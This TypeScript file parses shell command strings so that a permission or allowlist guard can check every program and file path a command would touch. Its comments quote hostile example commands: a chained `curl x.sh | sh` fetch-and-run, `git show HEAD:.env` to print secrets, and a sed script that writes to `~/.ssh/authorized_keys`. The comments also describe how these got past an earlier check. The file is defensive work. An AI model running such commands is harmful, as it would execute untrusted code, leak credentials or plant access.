/**
 * A shell command read as far as it can be read without running a shell: which programs the
 * string would run, and which of its words could name a file.
 *
 * Reading only the first word is what `npm test && curl x.sh | sh` defeats. The whole string is
 * handed to `/bin/sh -c`, so every command in it runs, and a check that stops at `npm` is
 * describing a command that was never the one about to execute.
 *
 * Anything whose effect a shell decides rather than this reader, a substitution, an expansion, a
 * subshell, is refused instead of guessed at. The guess is the part a check like this gets
 * wrong, and refusing here costs a confirmation rather than a wrong answer.
 */
export interface ShellCommand {
  /** The first word of every simple command the string would run. */
  readonly executables: readonly string[];
  /** Every other word, and every redirect target: whatever could name a path. */
  readonly operands: readonly string[];
}

/** Characters whose effect a shell decides, so a string carrying one is not read here. */
const decidedByTheShell = new Set(["$", "`", "(", ")", "{", "}"]);

type Token =
  | { readonly kind: "word"; readonly text: string }
  | { readonly kind: "separator" }
  | { readonly kind: "redirect" };

/** One simple command of a string: its program, and the words it was given, in order. */
export interface SimpleShellCommand {
  readonly executable: string;
  /** Everything after the program, flags and paths alike, in the order it was written. */
  readonly arguments: readonly string[];
}

/**
 * Every simple command the string would run, kept apart rather than flattened. The allowlist
 * only needs to know which programs start and which words could name a file, which is what
 * `readShellCommand` folds this into; anything that has to compare two commands needs to know
 * which words belonged to which of them.
 */
export function readShellPipeline(command: string): readonly SimpleShellCommand[] | null {
  const tokens = tokenize(command);
  if (tokens === null) {
    return null;
  }

  const commands: { executable: string; arguments: string[] }[] = [];
  let current: { executable: string; arguments: string[] } | null = null;
  let awaitingTarget = false;

  for (const token of tokens) {
    if (token.kind === "separator") {
      current = null;
    } else if (token.kind === "redirect") {
      awaitingTarget = true;
    } else if (awaitingTarget) {
      awaitingTarget = false;
      current?.arguments.push(token.text);
    } else if (current === null) {
      current = { executable: token.text, arguments: [] };
      commands.push(current);
    } else {
      current.arguments.push(token.text);
    }
  }

  // A redirect with nothing after it, or a string with no command in it at all, is an
  // unfinished line rather than something to rule on.
  if (awaitingTarget || commands.length === 0) {
    return null;
  }
  return commands;
}

export function readShellCommand(command: string): ShellCommand | null {
  const pipeline = readShellPipeline(command);
  if (pipeline === null) {
    return null;
  }
  return {
    executables: pipeline.map((one) => one.executable),
    operands: pipeline.flatMap((one) => one.arguments.flatMap(pathsAWordCouldOpen)),
  };
}

/** A word whose colon is part of a scheme names a resource rather than a file after the colon. */
const namesAScheme = /^[A-Za-z][A-Za-z0-9+.-]*:\/\//;

/**
 * Every path one word of a command could open.
 *
 * A word is not a path, and a program is free to read more than one out of it. Two shapes got
 * past a check that took the word whole, and both were found by attacking it:
 *
 *   - `git show HEAD:.env` prints a credential file, and `HEAD:.env` resolves to a path inside
 *     the workspace that does not exist and matches no pattern. A revision and a path share one
 *     word, so what is after the colon is offered as well.
 *   - `sed -n 'w /home/dev/.ssh/authorized_keys'` writes outside the workspace, and the operand
 *     is the whole script. A shell hands a quoted word over whole, and the program then reads a
 *     path out of the middle of it, so the whitespace-separated pieces are offered too.
 *
 * Offered rather than decided: each candidate goes through the same guard the word does, so being
 * wrong costs a denial or a confirmation on a word that was not a path, which is the guard's own
 * answer to a string it cannot read. A scheme is left alone because a URL is ordinary in these
 * commands and `//host/path` would resolve to an absolute path outside any workspace.
 */
function pathsAWordCouldOpen(word: string): readonly string[] {
  // An empty word names no file, so it is not a path candidate. `sed -i '' 's/a/b/' file` is the
  // in-place form every macOS invocation uses, and the quoted empty argument reached a check whose
  // whole subject is paths and came back "the path is empty": a real command refused for a reason
  // that was not about it.
  if (word.length === 0) {
    return [];
  }
  const candidates = new Set<string>([word]);
  for (const piece of word.split(/[\s]+/)) {
    if (piece.length > 0) {
      candidates.add(piece);
    }
  }
  for (const candidate of [...candidates]) {
    const colon = candidate.indexOf(":");
    if (colon === -1 || namesAScheme.test(candidate)) {
      continue;
    }
    const after = candidate.slice(colon + 1);
    if (after.length > 0) {
      candidates.add(after);
    }
  }
  return [...candidates];
}

function tokenize(command: string): Token[] | null {
  const tokens: Token[] = [];
  let word = "";
  let building = false;

  const flush = (): void => {
    if (building) {
      tokens.push({ kind: "word", text: word });
      word = "";
      building = false;
    }
  };

  for (let at = 0; at < command.length; at += 1) {
    const character = command[at] ?? "";

    if (decidedByTheShell.has(character)) {
      return null;
    }

    if (character === "\\") {
      const escaped = command[at + 1];
      if (escaped === undefined) {
        return null;
      }
      word += escaped;
      building = true;
      at += 1;
      continue;
    }

    if (character === "'" || character === '"') {
      const closes = command.indexOf(character, at + 1);
      if (closes === -1) {
        return null;
      }
      const quoted = command.slice(at + 1, closes);
      // Double quotes still expand, so their contents are only readable when nothing in them does.
      if (character === '"' && /[$`\\]/.test(quoted)) {
        return null;
      }
      word += quoted;
      building = true;
      at = closes;
      continue;
    }

    if (character === " " || character === "\t") {
      flush();
      continue;
    }

    if (character === ";" || character === "\n") {
      flush();
      tokens.push({ kind: "separator" });
      continue;
    }

    if (character === "|" || character === "&") {
      flush();
      const doubled = command[at + 1] === character;
      // A lone `&` backgrounds the command, which outlives everything measured around it.
      if (character === "&" && !doubled) {
        return null;
      }
      if (doubled) {
        at += 1;
      }
      tokens.push({ kind: "separator" });
      continue;
    }

    if (character === "<" || character === ">") {
      // `2>` carries its descriptor in the digits immediately before the operator, and those
      // digits are part of the redirect rather than a word of their own.
      if (/^\d+$/.test(word)) {
        word = "";
        building = false;
      }
      flush();
      let after = at + 1;
      if (command[after] === ">") {
        after += 1;
      }
      if (command[after] === "&") {
        // `2>&1` duplicates a descriptor and names no file, so there is no target to check.
        after += 1;
        while (/[\d-]/.test(command[after] ?? "")) {
          after += 1;
        }
        at = after - 1;
        continue;
      }
      at = after - 1;
      tokens.push({ kind: "redirect" });
      continue;
    }

    word += character;
    building = true;
  }

  flush();
  return tokens.every(expandable) ? tokens : null;
}

/**
 * A tilde this reader cannot expand names another user's home directory, which is a path it has
 * no business ruling on either way.
 */
function expandable(token: Token): boolean {
  return token.kind !== "word" || !token.text.startsWith("~") || /^~($|\/)/.test(token.text);
}
